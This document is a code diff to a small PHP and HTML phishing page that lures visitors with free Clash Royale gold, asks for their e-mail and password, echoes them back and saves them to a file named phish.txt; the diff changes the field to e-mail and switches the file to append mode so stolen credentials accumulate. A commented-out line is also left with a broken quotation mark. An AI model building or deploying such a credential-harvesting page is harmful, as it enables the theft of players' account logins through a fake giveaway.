@@ -9,7 +9,7 @@
 <body>
 <h2>Login for gratis gull i Clash Royale</h2>
 <form action="index.php" method="post">
-    <input type="text" name="username" placeholder="username" id="input"> <br>
+    <input type="text" name="E-mail" placeholder="E-mail" id="input"> <br>
     <input type="password" name="password" placeholder="password" id="input"> <br>
     <input type="submit" name="login" value="Log in" id="skibidi"> <br>
 </form>
@@ -17,26 +17,26 @@
 </html>
 <?php
 if (isset($_POST["login"])) {
-    $username = $_POST["username"];
+    $username = $_POST["E-mail"];
     $password = $_POST["password"];
 
     if (empty($username)) {
-        echo "Username is not filled in";
+        echo "E-mail is not filled in";
     } elseif (empty($password)) {
         echo "Password is not filled in";
     } else {
-        echo "Username = $username <br>";
+        echo "E-mail = $username <br>";
         echo "Password = $password <br>";
     }
 }
 
-($myfile = fopen("phish.txt", "w")) or die("Unable to open file!");
-fwrite($myfile, "Username: $username \n");
+($myfile = fopen("phish.txt", "a")) or die("Unable to open file!");
+fwrite($myfile, "E-mail: $username \n");
 fwrite($myfile, "Password: $password \n");
 fclose($myfile);
 
 /*foreach ($_POST as $key => $value) {
-        echo "$key = $value <br>";
+        echo "$key = $val"ue <br>";
         }*/
 
 
